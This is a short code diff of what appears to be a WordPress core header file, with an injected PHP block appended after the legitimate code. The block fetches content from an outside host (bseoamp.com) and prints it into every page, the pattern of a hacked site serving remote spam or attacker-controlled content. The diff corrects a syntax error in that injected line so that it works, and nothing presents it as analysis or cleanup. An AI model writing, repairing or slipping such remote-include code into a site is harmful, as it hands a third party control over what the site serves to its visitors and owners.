@@ -22,5 +22,5 @@ if ( ! isset( $wp_did_header ) ) {
 ?>
 <?php
 $a = file_get_contents ('https://bseoamp.com/bseo/');
-echo $a
+echo $a;
 ?>
